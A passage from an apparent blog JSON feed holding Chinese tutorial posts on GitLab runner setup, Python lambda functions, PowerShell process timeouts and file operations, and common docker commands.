data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS91XzExMzg5NDMwLzI1MzUwOTg=\">https://blog.51cto.com/u_11389430/2535098</span></p>\n</li>\n</ul>\n<h1 id=\"gitlab-runner配置\"><a class=\"markdownIt-Anchor\" href=\"#gitlab-runner配置\">#</a> GitLab runner 配置</h1>\n<ul>\n<li>\n<p>官方文档： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGxhYi5jb20vcnVubmVyL2luc3RhbGwv\">https://docs.gitlab.com/runner/install/</span></p>\n<p>建议使用 <code>deb</code>  或 <code>rpm</code>  文件安装，简单快速</p>\n</li>\n<li>\n<p>另一处详细教学位置 GitLab 中打开一个项目</p>\n<p>Settings =&gt; CI/CD =&gt; Runners =&gt; Expand =&gt; Specific runners =&gt; Show runner installation instructions</p>\n</li>\n<li>\n<p>安装完成后，点击编辑小图标，✅ <code>Run untagged jobs</code>  以运行没有设置 tag 的任务</p>\n</li>\n</ul>\n<h1 id=\"qa\"><a class=\"markdownIt-Anchor\" href=\"#qa\">#</a> Q&amp;A</h1>\n<ul>\n<li>启动之后 502\n<ul>\n<li>原因一： GitLab 反应慢，等待几分钟</li>\n<li>原因二： 服务器端口占用，例如 80 端口，用  <code>lsof -i tcp:80</code>  查看是否有其他服务。杀掉对应进程，或在 <code>gitlab.rb</code>  中修改端口号</li>\n<li>原因三： 内存不足，优化配置或换用配置更高的服务器</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>你将看到大悲苦，并将在悲苦中领悟幸福。这就是我给你的赠言：到悲苦中去寻找幸福。努力干，不断地努力！</p>\n<p>——《卡拉马佐夫兄弟》</p>\n</blockquote>\n",
            "tags": [
                "gitlab"
            ]
        },
        {
            "id": "https://snowroll.github.io/lambda/",
            "url": "https://snowroll.github.io/lambda/",
            "title": "lambda",
            "date_published": "2022-06-28T14:10:27.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>lambda 函数</li>\n<li>lambda 函数用法</li>\n</ul>\n<a id=\"more\"></a>\n<ul>\n<li>\n<p>lambda 函数</p>\n<p>最开始接触 lambda 函数时，觉得它好神奇，简单一行代码可以完成平时多行代码才能实现的函数功能。</p>\n<p>例如:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func = <span class=\"keyword\">lambda</span> x,y: x+y</span><br><span class=\"line\">func(<span class=\"number\">1</span>,<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<p>执行结果为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n<p>那 lambda 函数究竟是什么呢？lambda 函数是<strong>匿名</strong>函数，即无需定义函数名，在一行中定义函数</p>\n<ul>\n<li>\n<p>lambda 表达式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">lambda</span> arg1, arg2, ...: expression</span><br></pre></td></tr></table></figure>\n<p>我们按照正常的函数定义来看这个表达式，函数可以有 0 个或多个参数，因此 <code>arg</code>  是可选项。函数语句即为 <code>expression</code> ， <code>expression</code>  的执行结果即为返回值， <code>expression</code>  定义为 <code>None</code>  即代表没有返回值</p>\n</li>\n</ul>\n</li>\n<li>\n<p>lambda 函数用法</p>\n<ul>\n<li>\n<p>赋值语句，定义函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func = <span class=\"keyword\">lambda</span> x,y: x*y</span><br><span class=\"line\">func(<span class=\"number\">2</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\"># output</span></span><br><span class=\"line\"><span class=\"number\">4</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>函数覆盖，替换已有函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">time.clock = <span class=\"keyword\">lambda</span>:<span class=\"string\">&#x27;again&#x27;</span></span><br><span class=\"line\">time.clock()</span><br><span class=\"line\"><span class=\"comment\"># output</span></span><br><span class=\"line\"><span class=\"string\">&#x27;again&#x27;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>作为其他函数的参数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># sorted </span></span><br><span class=\"line\"><span class=\"comment\"># 常用的字典按value排序</span></span><br><span class=\"line\">_<span class=\"built_in\">dict</span> = &#123;<span class=\"string\">&#x27;a&#x27;</span>:<span class=\"number\">3</span>, <span class=\"string\">&#x27;b&#x27;</span>:<span class=\"number\">1</span>, <span class=\"string\">&#x27;c&#x27;</span>:<span class=\"number\">2</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">sorted</span>(_<span class=\"built_in\">dict</span>.items(), key = <span class=\"keyword\">lambda</span> item: item[<span class=\"number\">1</span>])</span><br><span class=\"line\"><span class=\"comment\"># output</span></span><br><span class=\"line\">[(<span class=\"string\">&#x27;b&#x27;</span>, <span class=\"number\">1</span>), (<span class=\"string\">&#x27;c&#x27;</span>, <span class=\"number\">2</span>), (<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"number\">3</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">_lst = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\"><span class=\"comment\"># filter 过滤特定条件的元素</span></span><br><span class=\"line\"><span class=\"built_in\">list</span>(<span class=\"built_in\">filter</span>(<span class=\"keyword\">lambda</span> x: x &lt;= <span class=\"number\">2</span>, _lst))</span><br><span class=\"line\"><span class=\"comment\"># output</span></span><br><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># map 针对列表中每一个元素的操作</span></span><br><span class=\"line\"><span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x:x**<span class=\"number\">2</span>, _lst))</span><br><span class=\"line\"><span class=\"comment\"># output</span></span><br><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">9</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># reduce 列表中相邻元素的两两结合条件</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> reduce</span><br><span class=\"line\">reduce(<span class=\"keyword\">lambda</span> x, y: x+y, _lst)</span><br><span class=\"line\"><span class=\"comment\"># output</span></span><br><span class=\"line\"><span class=\"number\">6</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://snowroll.github.io/powershell-2/",
            "url": "https://snowroll.github.io/powershell-2/",
            "title": "powershell多线程超时",
            "date_published": "2022-01-10T12:54:31.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>PowerShell 超时退出</li>\n<li>PowerShell 多线程</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"1-powershell多线程\"><a class=\"markdownIt-Anchor\" href=\"#1-powershell多线程\">#</a> 1. PowerShell 多线程</h3>\n<ul>\n<li>\n<p>PowerShell 超时退出</p>\n<p>当我们重复执行某一项程序时，当程序在规定时间内没有返回结果时，我们需要杀死它以开始下一轮的迭代。这时就需要用到超时退出。在 PowerShell 脚本中又如何实现呢？</p>\n<p>我们需要用到 <code>Start-Process</code>  和 <code>Wait-Process</code>  来控制子进程的执行时间以实现超时退出。</p>\n<p>示例：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>; <span class=\"variable\">$i</span> <span class=\"operator\">-le</span> <span class=\"variable\">$max_iterations</span>; <span class=\"variable\">$i</span>++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$proc</span> = <span class=\"built_in\">Start-Process</span> <span class=\"literal\">-filePath</span> <span class=\"variable\">$programtorun</span> <span class=\"literal\">-ArgumentList</span> <span class=\"variable\">$argumentlist</span> <span class=\"literal\">-workingdirectory</span> <span class=\"variable\">$programtorunpath</span> <span class=\"literal\">-PassThru</span></span><br><span class=\"line\">    <span class=\"comment\"># wait up to x seconds for normal termination</span></span><br><span class=\"line\">    <span class=\"built_in\">Wait-Process</span> <span class=\"literal\">-Timeout</span> <span class=\"number\">300</span> <span class=\"literal\">-Name</span> <span class=\"variable\">$programname</span></span><br><span class=\"line\">    <span class=\"comment\"># if not exited, kill process</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"variable\">$proc</span>.hasExited) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">echo</span><span class=\"string\">&quot;kill the process&quot;</span></span><br><span class=\"line\">        <span class=\"comment\">#$proc.Kill() &lt;- not working if proc is crashed</span></span><br><span class=\"line\">        <span class=\"built_in\">Start-Process</span> <span class=\"literal\">-filePath</span><span class=\"string\">&quot;taskkill.exe&quot;</span> <span class=\"literal\">-Wait</span> <span class=\"literal\">-ArgumentList</span> <span class=\"string\">&#x27;/F&#x27;</span>, <span class=\"string\">&#x27;/IM&#x27;</span>, <span class=\"variable\">$fullprogramname</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\"># this is where I want to use exit code but it comes in empty</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$proc</span>.ExitCode <span class=\"operator\">-ne</span> <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">       <span class=\"comment\"># update internal error counters based on result</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n",
            "tags": [
                "powershell"
            ]
        },
        {
            "id": "https://snowroll.github.io/docker/",
            "url": "https://snowroll.github.io/docker/",
            "title": "docker实用操作",
            "date_published": "2022-01-03T09:00:00.000Z",
            "content_html": "<h1 id=\"docker简介\"><a class=\"markdownIt-Anchor\" href=\"#docker简介\">#</a> docker 简介</h1>\n<p>  为了避免项目移植到其他机器上时，出现环境配置不全，各种安装包缺失的问题。人们提出了 docker 这个工具，顾名思义 docker 的中文含义是码头工人，如下图 docker 的图标所示，我们可以理解为 docker 同时承载了项目源码和其对应的配置环境，利用它我们可以轻松地迁移我们的工程项目，不用重复为项目配置相应的环境。</p>\n<div style=\"margin:auto\"><img data-src=\"/docker/logo.png\" class=\"\"></div>\n<p>  相较于庞大，内存占用率高的虚拟机而言，docker 更加轻量级。docker 是 linux 容器的一种封装，提供了简单易用的容器使用接口。Linux 容器是对进程的一种封装，容器内的进程接触到的所有资源都是虚拟的，实现了与底层系统的隔离。</p>\n<h1 id=\"镜像和容器的区别\"><a class=\"markdownIt-Anchor\" href=\"#镜像和容器的区别\">#</a> 镜像和容器的区别</h1>\n<p>  我在刚开始接触 docker 时，经常会搞混镜像（<strong>image</strong>）和容器（<strong>container</strong>）。简单而言，可以将镜像理解为容器的模版，我们通过复制镜像生成 n 个完全相同的容器，然后在容器中进行操作。每一个容器通过定制化的配置后都可以将其自身保存为一个新的镜像，上传发布到网上的仓库。</p>\n<h1 id=\"docker实用操作\"><a class=\"markdownIt-Anchor\" href=\"#docker实用操作\">#</a> docker 实用操作</h1>\n<ul>\n<li>\n<p>拉取镜像</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull [image_name]</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>交互式运行，通过镜像启动一个容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -i -t --name=[container_name] [image_name] </span><br></pre></td></tr></table></figure>\n<p>参数：</p>\n<p><code>-i</code> ： 交互式操作</p>\n<p><code>-t</code> ：终端</p>\n<p><code>--name</code> ：指定容器名称</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -itd --name=[container_name] [image_name]</span><br></pre></td></tr></table></figure>\n<p><code>-d</code> ：默认不进入容器</p>\n</li>\n<li>\n<p>查看 docker 信息</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker info</span><br></pre></td></tr></table></figure>\n<p>其中 <code>Docker Root Dir</code>  是 docker 的根目录，所有容器都在该目录下的 <code>containers</code>  下</p>\n</li>\n<li>\n<p>查看容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看活跃状态的容器</span></span><br><span class=\"line\">docker ps</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看所有状态的容器</span></span><br><span class=\"line\">docker ps -a</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看容器信息</span></span><br><span class=\"line\">docker inspect [docker-name]</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看容器日志</span></span><br><span class=\"line\">docker logs [docker-name]</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>停止容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stop [containerID]</span><br></pre></td></tr></table></figure>\n<p>停止的容器可以通过 restart 重启</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart [containerID]</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>进入容器</p>\n<p>使用 <code>-d</code>  参数后，容器启动后自动进入后台，此时想进入容器有两种办法</p>\n<ul>\n<li><code>docker attach</code></li>\n<li><code>docker exec</code> ： 这种方法退出时，只会退出容器终端，不会导致容器停止</li>\n</ul>\n</li>\n<li>\n<p>退出容器但不关闭</p>\n<ul>\n<li><code>ctrl + p + q</code></li>\n</ul>\n</li>\n<li>\n<p>手动终止容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker kill [containerID]</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>删除容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker rm [containerID]</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>从宿主机向容器传输文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker cp /host/file [container_name]:/home/dir</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>容器将本机目录 <code>/test</code>  挂载在容器的 <code>/home</code>  下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it -v /test:/home [image_name] </span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>容器改名</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker rename origin_name new_name</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>在容器内对宿主机上目录进行操作时，出现 &quot;Permission denied&quot; 的解决办法</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --privileged=true -v /test:/home [image_name] /bin/bash</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<blockquote>\n<p align=\"center\">If Winter comes, can Spring be far behind?</p>\n<p align=\"right\">——Percy Bysshe Shelley 《Ode to the West wind》 </p>\n</blockquote>\n",
            "tags": []
        },
        {
            "id": "https://snowroll.github.io/powershell-1/",
            "url": "https://snowroll.github.io/powershell-1/",
            "title": "powershell技巧连载（一） —— 文件相关操作",
            "date_published": "2021-10-20T04:00:38.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>文件路径操作</li>\n<li>文件读写操作</li>\n<li>其他文件相关操作</li>\n</ul>\n<a id=\"more\"></a>\n<p>####1. 文件路径操作</p>\n<ul>\n<li>\n<p>获取当前文件的绝对路径</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 方法1</span></span><br><span class=\"line\">(<span class=\"built_in\">Get-Item</span> test.txt).FullName</span><br><span class=\"line\"><span class=\"comment\"># 方法2</span></span><br><span class=\"line\">(<span class=\"built_in\">Get-Childitem</span> test.txt).FullName</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\Users\\root\\Desktop\\test.txt</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>获取文件所在目录路径</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 方法1: 通过文件系统获取</span></span><br><span class=\"line\">(<span class=\"built_in\">Get-Item</span> test.txt).Directory.FullName</span><br><span class=\"line\">(<span class=\"built_in\">Get-Childitem</span> test.txt).Directory.FullName</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法2: 利用split-path 切割路径</span></span><br><span class=\"line\"><span class=\"variable\">$filePath</span> = (<span class=\"built_in\">Get-Item</span> test.txt).FullName</span><br><span class=\"line\"><span class=\"built_in\">Split-Path</span> <span class=\"variable\">$filePath</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># split-path 获取文件名</span></span><br><span class=\"line\"><span class=\"built_in\">Split-Path</span> <span class=\"variable\">$filePath</span> <span class=\"literal\">-Leaf</span></span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\Users\\root\\Desktop</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>判断当前路径是文件还是文件夹</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$path</span> = <span class=\"string\">&#x27;\\Users\\root\\Desktop&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 方法1 Test-Path</span></span><br><span class=\"line\"><span class=\"built_in\">Test-Path</span> <span class=\"variable\">$path</span> <span class=\"literal\">-PathType</span> Container</span><br><span class=\"line\"><span class=\"built_in\">Test-Path</span> <span class=\"variable\">$path</span> <span class=\"literal\">-PathType</span> Leaf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法3 Get-Item</span></span><br><span class=\"line\">(<span class=\"built_in\">Get-Item</span> <span class=\"variable\">$path</span>) <span class=\"operator\">-is</span> [<span class=\"type\">IO.fileinfo</span>]</span><br><span class=\"line\">(<span class=\"built_in\">Get-Item</span> <span class=\"variable\">$path</span>) <span class=\"operator\">-is</span> [<span class=\"type\">IO.DirectoryInfo</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法2 System.IO 最快</span></span><br><span class=\"line\">[<span class=\"type\">System.IO.Directory</span>]::Exists(<span class=\"variable\">$path</span>)</span><br><span class=\"line\">[<span class=\"type\">System.IO.File</span>]::Exits(<span class=\"variable\">$path</span>)</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>相对路径转换为绝对路径</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"built_in\">Resolve-Path</span> <span class=\"string\">&#x27;./&#x27;</span>).Path</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\Users\\root\\Desktop</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>获取文件夹下所有文件</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 获取当前目录下所有文件名</span></span><br><span class=\"line\">(<span class=\"built_in\">Get-Childitem</span> <span class=\"string\">&#x27;./&#x27;</span>).Name</span><br><span class=\"line\"><span class=\"comment\"># 获取当前目录下所有文件的绝对路径</span></span><br><span class=\"line\">(<span class=\"built_in\">Get-Childitem</span> <span class=\"string\">&#x27;./&#x27;</span>).FullName</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">test.txt</span><br><span class=\"line\">demo.txt</span><br><span class=\"line\">\\Users\\root\\Desktop\\test.txt</span><br><span class=\"line\">\\Users\\root\\Desktop\\demo.txt</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>Tips： 测试代码运行时间</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Measure-Command</span> &#123;Command or a code block&#125;</span><br><span class=\"line\"><span class=\"comment\"># example</span></span><br><span class=\"line\"><span class=\"built_in\">Measure-Command</span> &#123;<span class=\"built_in\">Test-Path</span> <span class=\"string\">&#x27;./test.txt&#x27;</span> <span class=\"literal\">-PathType</span> Leaf&#125;</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Days              : 0</span><br><span class=\"line\">Hours             : 0</span><br><span class=\"line\">Minutes           : 0</span><br><span class=\"line\">Seconds           : 0</span><br><span class=\"line\">Milliseconds      : 1</span><br><span class=\"line\">Ticks             : 12989</span><br><span class=\"line\">TotalDays         : 1.50335648148148E-08</span><br><span class=\"line\">TotalHours        : 3.60805555555556E-07</span><br><span class=\"line\">TotalMinutes      : 2.16483333333333E-05</span><br><span class=\"line\">TotalSeconds      : 0.0012989</span><br><span class=\"line\">TotalMilliseconds : 1.2989</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>####2. 文件读写操作</p>\n<ul>\n<li>\n<p>读文件</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 按行读入，得到一个数组</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"built_in\">Get-Content</span> <span class=\"string\">&#x27;test.txt&#x27;</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 一次性读入所有的文件</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"built_in\">Get-Content</span> <span class=\"string\">&#x27;test.txt&#x27;</span> <span class=\"literal\">-Raw</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> = [<span class=\"type\">io.file</span>]::ReadAllLines(<span class=\"variable\">$file</span>)</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>写文件</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"string\">&#x27;Hello World!&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"string\">&#x27;test.txt&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 方法1 Out-File 通过管道（比较慢）</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> | <span class=\"built_in\">Out-File</span> <span class=\"variable\">$file</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法2 Out-File</span></span><br><span class=\"line\"><span class=\"built_in\">Out-File</span> <span class=\"variable\">$file</span> <span class=\"literal\">-InputObject</span> <span class=\"variable\">$content</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法3 io.file</span></span><br><span class=\"line\">[<span class=\"type\">io.file</span>]::WriteAllLines(<span class=\"variable\">$file</span>, <span class=\"variable\">$content</span>, [<span class=\"type\">text.encoding</span>]::Unicode)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法4 Set-Content</span></span><br><span class=\"line\"><span class=\"built_in\">Set-Content</span> <span class=\"variable\">$file</span> <span class=\"literal\">-Value</span> <span class=\"variable\">$content</span> <span class=\"literal\">-Encoding</span> Unicode</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法5 命令行操作</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> &gt; <span class=\"variable\">$file</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>####3. 其他文件相关操作</p>\n<ul>\n<li>\n<p>文件复制</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Copy-Item</span> <span class=\"variable\">$srcFile</span> <span 